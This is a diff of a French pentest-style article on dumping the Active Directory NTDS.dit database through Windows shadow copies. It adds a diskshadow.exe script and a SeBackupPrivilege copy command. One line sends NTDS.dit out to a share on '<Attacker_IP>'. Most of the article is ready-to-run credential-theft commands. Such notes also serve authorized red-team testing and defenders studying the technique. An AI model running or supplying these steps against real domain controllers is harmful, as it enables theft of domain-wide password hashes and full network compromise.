@@ -1,10 +1,12 @@
 ---
-public: true # set to true to make the article publishable
+public: true
 ---
 
 ## Localement
 
-### Créer une Shadow Copy (cliché instantanné) du disque C
+### Cliché instantané (vssadmin)
+
+#### Créer une Shadow Copy (cliché instantanné) du disque C
 
 La base NTDS.dit est par défaut stockée dans `C:\Windows\NTDS`
 
@@ -19,11 +21,38 @@ Successfully created shadow copy for 'C:\'
     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
 ```
 
-### Copier à partir du cliché instantanné
+#### Copier à partir du cliché instantanné
 
 ```
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \\<Attacker_IP>\share\
 ```
+
+
+### Cliché instantanné (diskshadow.exe)
+
+#### Créer une Shadow Copy (cliché instantanné) du disque C
+
+```shell
+diskshadow.exe
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+```
+
+#### Copier à partir du cliché instantanné
+
+
+```
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+```
+
 
 ## A distance
 
